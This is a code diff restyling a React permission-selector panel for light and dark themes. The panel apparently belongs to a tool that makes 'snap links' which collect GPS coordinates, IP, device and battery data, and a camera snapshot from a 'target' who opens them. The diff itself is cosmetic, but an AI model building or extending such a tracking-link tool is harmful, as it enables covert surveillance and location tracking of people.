@@ -26,19 +26,19 @@ export const PermissionSelector: React.FC<PermissionSelectorProps> = ({ config, 
       key: "location",
       title: "GPS Location",
       desc: "Capture high-accuracy coordinates & Google Maps pin",
-      icon: <MapPin className="w-4 h-4 text-[#FFFC00]" />,
+      icon: <MapPin className="w-4 h-4 text-amber-600 dark:text-[#FFFC00]" />,
     },
     {
       key: "device_info",
       title: "Device & Battery Telemetry",
       desc: "OS, browser, screen size, IP, battery percentage & charging",
-      icon: <Smartphone className="w-4 h-4 text-[#FFFC00]" />,
+      icon: <Smartphone className="w-4 h-4 text-amber-600 dark:text-[#FFFC00]" />,
     },
     {
       key: "camera",
       title: "Camera Photo Verification",
       desc: "Prompt camera verification and capture snapshot",
-      icon: <Camera className="w-4 h-4 text-[#FFFC00]" />,
+      icon: <Camera className="w-4 h-4 text-amber-600 dark:text-[#FFFC00]" />,
     },
   ];
 
@@ -46,14 +46,18 @@ export const PermissionSelector: React.FC<PermissionSelectorProps> = ({ config, 
     <div className="space-y-2">
       <div className="flex items-center justify-between">
         <div className="flex items-center gap-1.5">
-          <label className="text-xs font-bold text-white">Requested Permissions & Telemetry</label>
+          <label className="text-xs font-bold text-slate-900 dark:text-white">
+            Requested Permissions &amp; Telemetry
+          </label>
           <Tooltip
             content="Controls which sensors and data payloads are requested when the target opens your snap link."
             placement="bottom-left"
             widthClass="w-64"
           />
         </div>
-        <span className="text-[10px] text-white/40 font-normal">Configured per link</span>
+        <span className="text-[10px] text-slate-500 dark:text-white/40 font-normal">
+          Configured per link
+        </span>
       </div>
 
       <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
@@ -65,22 +69,24 @@ export const PermissionSelector: React.FC<PermissionSelectorProps> = ({ config, 
               onClick={() => toggle(opt.key)}
               className={`p-3 rounded-2xl border cursor-pointer transition-all flex items-start justify-between gap-3 ${
                 isEnabled
-                  ? "bg-[#1A1A22] border-[#FFFC00]/40"
-                  : "bg-[#141418] border-white/5 opacity-60 hover:opacity-100"
+                  ? "bg-amber-500/10 dark:bg-[#1A1A22] border-amber-500/50 dark:border-[#FFFC00]/40 shadow-sm"
+                  : "bg-slate-50 dark:bg-[#141418] border-slate-200 dark:border-white/5 opacity-70 hover:opacity-100"
               }`}
             >
               <div className="flex items-start gap-2.5">
                 <div className="mt-0.5">{opt.icon}</div>
                 <div>
-                  <p className="text-xs font-bold text-white">{opt.title}</p>
-                  <p className="text-[10px] text-white/50 leading-tight mt-0.5">{opt.desc}</p>
+                  <p className="text-xs font-bold text-slate-900 dark:text-white">{opt.title}</p>
+                  <p className="text-[10px] text-slate-600 dark:text-white/60 leading-tight mt-0.5">
+                    {opt.desc}
+                  </p>
                 </div>
               </div>
               <input
                 type="checkbox"
                 checked={isEnabled}
                 onChange={() => {}}
-                className="w-4 h-4 accent-[#FFFC00] rounded mt-0.5 pointer-events-none"
+                className="w-4 h-4 accent-amber-500 dark:accent-[#FFFC00] rounded mt-0.5 pointer-events-none"
               />
             </div>
           );
